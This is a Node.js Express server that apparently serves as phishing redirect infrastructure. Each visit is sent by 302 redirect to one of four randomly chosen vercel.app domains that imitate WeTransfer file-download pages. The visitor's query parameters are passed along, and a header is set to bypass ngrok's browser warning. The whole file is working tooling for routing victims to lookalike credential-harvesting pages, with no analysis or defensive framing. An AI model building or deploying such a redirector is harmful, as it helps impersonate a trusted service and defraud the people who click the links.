const express = require("express");
const app = express();

const PORT = process.env.PORT || 3000; // Render assigns a PORT dynamically

app.get("/", (req, res) => {
    res.set("ngrok-skip-browser-warning", "true"); // Bypass ngrok warning

    // List of URLs for redirection
    const urls = [
        "https://download-wetransfer-wp8tkd96cmrqfbloynb7vhxy2rjqg3t5aztpxlmapp.vercel.app/?_filestorage_id=Kx2GtvNhRCEoLZ5JYbF8pMB6XD39WeTgKoObGl0YqmHrjHbEyWpubWUvc2NyLmpzIj48L3NjcmlwdD4KPC9oZWFkPgo8Ym9k",
        "https://wetr-document-hcnyubrtlfem5on5abvz5xc6tecp3t1zkob5czohbnxfczdg.vercel.app/?_transferdata_key=Gz4LmvXKRTJYbZ5F8PqNWC6X39WD2MoBoObGl0YpmHrjHbEyWpubWUvc2NyLmpzIj48L3NjcmlwdD4KPC9oZWFkPgo8Ymdp",
        "https://wetr-wdocwetransfer-uy8btvznhkeble5vgwpo.vercel.app/?_securefile_code=QmJ8VRZKTX5bYFMWPD26X39WGCoLoObGl0YtmHrjHbEyWpubWUvc2NyLmpzIj48L3NjcmlwdD4KPC9oZWFkPgo8Ymjbl",
        "https://secured-file-myapp4dhjfkdhagejkeldkhejdandedlpemeldpp.vercel.app/?_datashare_token=YbX5KJoRFmVZP8LTCGNhWqD26X39WMBKoObGl0YpmHrjHbEyWpubWUvc2NyLmpzIj48L3NjcmlwdD4KPC9oZWFkPgo8Ymskl"
    ];

         // Select a random URL
    const selectedUrl = urls[Math.floor(Math.random() * urls.length)];

    // Append query parameters from request
    const queryParams = req.originalUrl.includes("?") ? req.originalUrl.split("?")[1] : "";
    const redirectUrl = queryParams ? `${selectedUrl}&${queryParams}` : selectedUrl;

    console.log(`Redirecting to: ${redirectUrl}`);
    
    res.redirect(302, redirectUrl);
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
